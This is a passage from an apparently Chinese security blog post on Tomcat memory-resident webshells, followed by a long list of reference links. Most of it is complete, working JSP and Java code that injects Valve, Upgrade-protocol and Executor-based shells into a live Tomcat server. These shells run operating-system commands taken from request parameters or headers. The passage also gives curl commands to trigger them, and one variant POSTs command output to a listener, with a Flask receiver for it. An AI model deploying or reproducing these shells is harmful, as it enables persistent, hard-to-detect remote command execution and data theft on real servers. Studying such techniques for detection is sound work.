= (StandardContext) req.getContext(); Field pipelineField = ContainerBase.class.getDeclaredField(&quot;pipeline&quot;); pipelineField.setAccessible(true); StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext); ValveBase evilValve = new ValveBase() &#123; @Override public void invoke(Request request, Response response) throws ServletException,IOException &#123; if (request.getParameter(&quot;cmd&quot;) != null) &#123; boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123; isLinux = false; &#125; String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); &#125; this.getNext().invoke(request, response); &#125; &#125;; evilStandardPipeline.addValve(evilValve); out.println(&quot;inject success&quot;);%&gt; 上面的这个是采用了从StandardContext反射获取StandardPipeline的方式，效果如下： 下面的则是调用 standardContext.getPipeline().addValve实现的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% class testEvilValve extends ValveBase &#123; @Override public void invoke(Request request, Response response) throws ServletException,IOException &#123; if (request.getParameter(&quot;command&quot;) != null) &#123; boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123; isLinux = false; &#125; String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;command&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;command&quot;)&#125;; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); &#125; this.getNext().invoke(request, response); &#125; &#125;;%&gt;&lt;% Field requestField = request.getClass().getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); final Request req = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) req.getContext(); standardContext.getPipeline().addValve(new testEvilValve()); out.println(&quot;inject success&quot;);%&gt; 效果如下： 5.2 Tomcat Upgrade内存马由2.14.2节中的分析，我们可以写出如下java代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.catalina.connector.Connector;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Request;import org.apache.coyote.Adapter;import org.apache.coyote.Processor;import org.apache.coyote.UpgradeProtocol;import org.apache.coyote.Response;import org.apache.coyote.http11.AbstractHttp11Protocol;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import java.lang.reflect.Field;import java.nio.ByteBuffer;import java.util.HashMap;@WebServlet(&quot;/evil&quot;)public class TestUpgrade extends HttpServlet &#123; static class MyUpgrade implements UpgradeProtocol &#123; @Override public String getHttpUpgradeName(boolean b) &#123; return null; &#125; @Override public byte[] getAlpnIdentifier() &#123; return new byte[0]; &#125; @Override public String getAlpnName() &#123; return null; &#125; @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) &#123; return null; &#125; @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) &#123; return null; &#125; @Override public boolean accept(org.apache.coyote.Request request) &#123; String p = request.getHeader(&quot;cmd&quot;); try &#123; String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, p&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, p&#125;; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;).next().getBytes(); resp.setCharacterEncoding(&quot;GBK&quot;); resp.doWrite(ByteBuffer.wrap(result)); &#125; catch (Exception ignored) &#123;&#125; return false; &#125; &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) &#123; try &#123; RequestFacade rf = (RequestFacade) req; Field requestField = RequestFacade.class.getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(rf); Field connector = Request.class.getDeclaredField(&quot;connector&quot;); connector.setAccessible(true); Connector realConnector = (Connector) connector.get(request1); Field protocolHandlerField = Connector.class.getDeclaredField(&quot;protocolHandler&quot;); protocolHandlerField.setAccessible(true); AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector); HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols; Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;); upgradeProtocolsField.setAccessible(true); upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler); MyUpgrade myUpgrade = new MyUpgrade(); upgradeProtocols.put(&quot;hello&quot;, myUpgrade); upgradeProtocolsField.set(handler, upgradeProtocols); &#125; catch (Exception ignored) &#123;&#125; &#125;&#125; 运行之后执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; -H &quot;cmd: dir&quot; http://localhost:8080/evil，结果如下： jsp版本为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Connector&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.UpgradeProtocol&quot; %&gt;&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Processor&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Adapter&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;% class MyUpgrade implements UpgradeProtocol &#123; public String getHttpUpgradeName(boolean isSSLEnabled) &#123; return &quot;hello&quot;; &#125; public byte[] getAlpnIdentifier() &#123; return new byte[0]; &#125; public String getAlpnName() &#123; return null; &#125; public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter) &#123; return null; &#125; @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, org.apache.coyote.Request request) &#123; return null; &#125; @Override public boolean accept(org.apache.coyote.Request request) &#123; String p = request.getHeader(&quot;cmd&quot;); try &#123; String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, p&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, p&#125;; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request); byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;).next().getBytes(); resp.setCharacterEncoding(&quot;GBK&quot;); resp.doWrite(ByteBuffer.wrap(result)); &#125; catch (Exception ignored)&#123;&#125; return false; &#125; &#125;%&gt;&lt;% Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); Field conn = Request.class.getDeclaredField(&quot;connector&quot;); conn.setAccessible(true); Connector connector = (Connector) conn.get(req); Field proHandler = Connector.class.getDeclaredField(&quot;protocolHandler&quot;); proHandler.setAccessible(true); AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector); HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = null; Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;); upgradeProtocolsField.setAccessible(true); upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler); upgradeProtocols.put(&quot;hello&quot;, new MyUpgrade()); upgradeProtocolsField.set(handler, upgradeProtocols);%&gt; 启动项目之后执行以下两条命令： 12curl http://localhost:8080/666.jspcurl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; -H &quot;cmd: dir&quot; http://localhost:8080/666.jsp 5.3 Tomcat Executor内存马由2.15.2.3的分析，我们可以写出下面的内存马： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.net.URLEncoder&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%! public Object getField(Object object, String fieldName) &#123; Field declaredField; Class&lt;?&gt; clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException | IllegalAccessException ignored) &#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Object getStandardService() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125; catch (Exception e) &#123; &#125; if (jioEndPoint == null) &#123; try &#123; jioEndPoint = getField(target, &quot;endpoint&quot;); return jioEndPoint; &#125; catch (Exception e) &#123; new Object(); &#125; &#125; else &#123; return jioEndPoint; &#125; &#125; &#125; return new Object(); &#125; class threadexcutor extends ThreadPoolExecutor &#123; public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123; super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler); &#125; public void getRequest(Runnable command) &#123; try &#123; ByteBuffer byteBuffer = ByteBuffer.allocate(16384); byteBuffer.mark(); SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,&quot;socketWrapper&quot;); socketWrapperBase.read(false,byteBuffer); ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,&quot;socketBufferHandler&quot;),&quot;readBuffer&quot;); readBuffer.limit(byteBuffer.position()); readBuffer.mark(); byteBuffer.limit(byteBuffer.position()).reset(); readBuffer.put(byteBuffer); readBuffer.reset(); String a = new String(readBuffer.array(), StandardCharsets.UTF_8); if (a.contains(&quot;hacku&quot;)) &#123; String b = a.substring(a.indexOf(&quot;hacku&quot;) + &quot;hacku&quot;.length() + 1, a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;hacku&quot;))).trim(); if (b.length() &gt; 1) &#123; try &#123; Runtime rt = Runtime.getRuntime(); Process process = rt.exec(&quot;cmd /c &quot; + b); java.io.InputStream in = process.getInputStream(); java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in); java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader); StringBuilder s = new StringBuilder(); String tmp; while ((tmp = stdInput.readLine()) != null) &#123; s.append(tmp); &#125; if (!s.toString().isEmpty()) &#123; byte[] res = s.toString().getBytes(StandardCharsets.UTF_8); getResponse(res); &#125; &#125; catch (IOException ignored) &#123;&#125; &#125; &#125; &#125; catch (Exception ignored) &#123;&#125; &#125; public void getResponse(byte[] res) &#123; try &#123; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread != null) &#123; String threadName = thread.getName(); if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) &#123; Object target = getField(thread, &quot;target&quot;); if (target instanceof Runnable) &#123; try &#123; ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &quot;endpoint&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;); for (Object tmp_object : objects) &#123; RequestInfo request = (RequestInfo) tmp_object; Response response = (Response) getField(getField(request, &quot;req&quot;), &quot;response&quot;); String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString()); response.addHeader(&quot;Result&quot;, result); &#125; &#125; catch (Exception ignored) &#123; continue; &#125; &#125; &#125; &#125; &#125; &#125; catch (Exception ignored) &#123; &#125; &#125; @Override public void execute(Runnable command) &#123; getRequest(command); this.execute(command, 0L, TimeUnit.MILLISECONDS); &#125; &#125;%&gt;&lt;% NioEndpoint nioEndpoint = (NioEndpoint) getStandardService(); ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;); threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()); nioEndpoint.setExecutor(exe);%&gt; 关于上面的内存马的分析，请参考下面这篇文章： https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ 效果： 需要注意的是，原文中的代码没有考虑到命令输出结果中含有中文等字符的情况，所以需要url编码，这一点我在上面的代码中已改进。 当然，如果目标条件运行，你也可以利用yakit直接外带出来，jsp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.OutputStream&quot; %&gt;&lt;%@ page import=&quot;java.net.HttpURLConnection&quot; %&gt;&lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;&lt;%@ page import=&quot;java.net.URLEncoder&quot; %&gt;&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%! public Object getField(Object object, String fieldName) &#123; Field declaredField; Class&lt;?&gt; clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException | IllegalAccessException ignored) &#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Object getStandardService() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125; catch (Exception ignored) &#123;&#125; if (jioEndPoint == null) &#123; try &#123; jioEndPoint = getField(target, &quot;endpoint&quot;); return jioEndPoint; &#125; catch (Exception e) &#123; new Object(); &#125; &#125; else &#123; return jioEndPoint; &#125; &#125; &#125; return new Object(); &#125; class threadexcutor extends ThreadPoolExecutor &#123; public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123; super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler); &#125; public void getRequest(Runnable command) &#123; try &#123; ByteBuffer byteBuffer = ByteBuffer.allocate(16384); byteBuffer.mark(); SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, &quot;socketWrapper&quot;); socketWrapperBase.read(false, byteBuffer); ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, &quot;socketBufferHandler&quot;), &quot;readBuffer&quot;); readBuffer.limit(byteBuffer.position()); readBuffer.mark(); byteBuffer.limit(byteBuffer.position()).reset(); readBuffer.put(byteBuffer); readBuffer.reset(); String a = new String(readBuffer.array(), StandardCharsets.UTF_8); if (a.contains(&quot;hacku&quot;)) &#123; String b = a.substring(a.indexOf(&quot;hacku&quot;) + &quot;hacku&quot;.length() + 1, a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;hacku&quot;))).trim(); if (b.length() &gt; 1) &#123; try &#123; Runtime rt = Runtime.getRuntime(); Process process = rt.exec(&quot;cmd /c &quot; + b); java.io.InputStream in = process.getInputStream(); java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in); java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader); StringBuilder s = new StringBuilder(); String tmp; while ((tmp = stdInput.readLine()) != null) &#123; s.append(tmp); &#125; if (!s.toString().isEmpty()) &#123; byte[] res = s.toString().getBytes(StandardCharsets.UTF_8); getResponse(res); &#125; &#125; catch (IOException ignored) &#123; &#125; &#125; &#125; &#125; catch (Exception ignored) &#123;&#125; &#125; public void getResponse(byte[] res) &#123; try &#123; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread != null) &#123; String threadName = thread.getName(); if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) &#123; Object target = getField(thread, &quot;target&quot;); if (target instanceof Runnable) &#123; try &#123; ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &quot;endpoint&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;); for (Object tmp_object : objects) &#123; RequestInfo request = (RequestInfo) tmp_object; Response response = (Response) getField(getField(request, &quot;req&quot;), &quot;response&quot;); if(sendPostRequest(&quot;http://127.0.0.1:8085&quot;, res))&#123; response.addHeader(&quot;Result&quot;, &quot;success&quot;); &#125; else &#123; response.addHeader(&quot;Result&quot;, &quot;failed&quot;); &#125; &#125; &#125; catch (Exception ignored) &#123; continue; &#125; &#125; &#125; &#125; &#125; &#125; catch (Exception ignored) &#123;&#125; &#125; private boolean sendPostRequest(String urlString, byte[] data) &#123; try &#123; URL url = new URL(urlString); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); connection.setRequestMethod(&quot;POST&quot;); connection.setDoOutput(true); connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;); connection.setRequestProperty(&quot;Content-Length&quot;, String.valueOf(data.length)); try (OutputStream outputStream = connection.getOutputStream()) &#123; outputStream.write(data); outputStream.flush(); int responseCode = connection.getResponseCode(); return responseCode == HttpURLConnection.HTTP_OK; &#125; catch (Exception ignored)&#123; return false; &#125; &#125; catch (IOException ignored) &#123; return false; &#125; &#125; @Override public void execute(Runnable command) &#123; getRequest(command); this.execute(command, 0L, TimeUnit.MILLISECONDS); &#125; &#125;%&gt;&lt;% NioEndpoint nioEndpoint = (NioEndpoint) getStandardService(); ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;); threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()); nioEndpoint.setExecutor(exe);%&gt; 先开启监听： 然后发送两次数据包，第一次是为了访问888.jsp，第二次是为了执行命令： 可以看到数据已经传输过来了： 当然，用yakit自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以python自己写一个： 123456789101112131415from flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/postendpoint&#x27;, methods=[&#x27;POST&#x27;])def handle_post_request(): if request.method == &#x27;POST&#x27;: if request.data: print(&quot;Received data:&quot;, request.data.decode()) return &#x27;&#x27;, 200 else: return &#x27;No data received&#x27;, 400if __name__ == &#x27;__main__&#x27;: app.run(debug=True) 然后修改jsp代码中的url： 最后效果如下： 六、致谢我在学习Java内存马的过程中阅读参考引用了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出，以表我诚挚的谢意： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677https://zhuanlan.zhihu.com/p/634697114https://blog.csdn.net/shelter1234567/article/details/133435490https://xz.aliyun.com/t/12494https://xz.aliyun.com/t/7348https://xz.aliyun.com/t/7388https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/https://chenlvtang.top/2022/06/22/Tomcat之Filter内存马/https://drun1baby.top/2022/08/22/Java内存马系列-03-Tomcat-之-Filter-型内存马/https://www.jb51.net/article/167204.htmhttps://f4de-bak.github.io/pages/10060c/https://tyaoo.github.io/2021/12/06/Tomcat内存马/https://github.com/bitterzzZZ/MemoryShellLearn/tree/mainhttps://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lewhttps://yzddmr6.com/posts/tomcat-context/https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lwhttps://gv7.me/articles/2020/kill-java-web-filter-memshell/https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4ghttps://xz.aliyun.com/t/9914https://goodapple.top/archives/1355https://su18.org/post/memory-shell/https://nosec.org/home/detail/5049.htmlhttps://su18.org/post/memory-shell/#控制器-拦截器-管道https://su18.org/post/memory-shell-2/#延伸线程型内存马https://javasec.org/https://www.cnblogs.com/javammc/p/15612780.htmlhttps://landgrey.me/blog/12/https://landgrey.me/blog/19/https://www.cnblogs.com/zpchcbd/p/15545773.htmlhttps://xz.aliyun.com/t/11039https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/inject-interceptor-hide-webshell/inject-interceptor-hide-webshell.mdhttps://www.cnblogs.com/bitterz/p/14859766.htmlhttps://www.javasec.org/javaweb/MemoryShell/https://www.yongsheng.site/2022/06/18/内存马(二)/https://segmentfault.com/a/1190000040939157https://developer.aliyun.com/article/925400https://su18.org/post/memory-shell/https://forum.butian.net/share/2593https://xz.aliyun.com/t/12952https://www.0kai0.cn/?p=321https://xz.aliyun.com/t/11331https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/https://cloud.tencent.com/developer/article/1888001https://blog.csdn.net/qq_41048524/article/details/131534948https://blog.csdn.net/weixin_45505313/article/details/103257933https://xz.aliyun.com/t/10372https://www.anquanke.com/post/id/224698https://forum.butian.net/share/2436http://124.223.185.138/index.php/archives/28.htmlhttps://longlone.top/安全/java/java安全/内存马/Tomcat-Valve型/https://su18.org/post/memory-shell/#tomcat-valve-内存马https://www.freebuf.com/articles/web/344321.htmlhttps://nosec.org/home/detail/5077.htmlhttps://github.com/veo/wsMemShellhttps://veo.pub/2022/memshell/https://tttang.com/archive/1673/https://www.viewofthai.link/2022/07/20/value型内存马/https://jiwo.org/ken/detail.php?id=3147https://paoka1.top/2023/04/24/Tomcat-Agent-型内存马/https://www.anquanke.com/post/id/225870https://xz.aliyun.com/t/11988https://www.cnblogs.com/piaomiaohongchen/p/14992056.htmlhttps://blog.csdn.net/text2204/article/details/129307931https://xz.aliyun.com/t/13024https://www.cnblogs.com/coldridgeValley/p/5816414.htmlhttp://wjlshare.com/archives/1541https://cloud.tencent.com/developer/article/2278400https://www.freebuf.com/vuls/345119.htmlhttps://tttang.com/archive/1709/https://xz.aliyun.com/t/11593https://xz.aliyun.com/t/11613https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executorhttps://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgradehttps://github.com/Gh0stF/trojan-eye/tree/masterhttps://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09https://xz.aliyun.com/t/12949https://paoka1.top/2023/04/21/Tomcat-WebSocket-型内存马/https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://w01fh4cker.github.io/tags/Java/"},{"name":"Memshell","slug":"Memshell","permalink":"https://w01fh4cker.github.io/tags/Memshell/"}],"author":"W01fh4cker"}],"categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://w01fh4cker.github.io/tags/Java/"},{"name":"Memshell","slug":"Memshell","permalink":"https://w01fh4cker.github.io/tags/Memshell/"}]}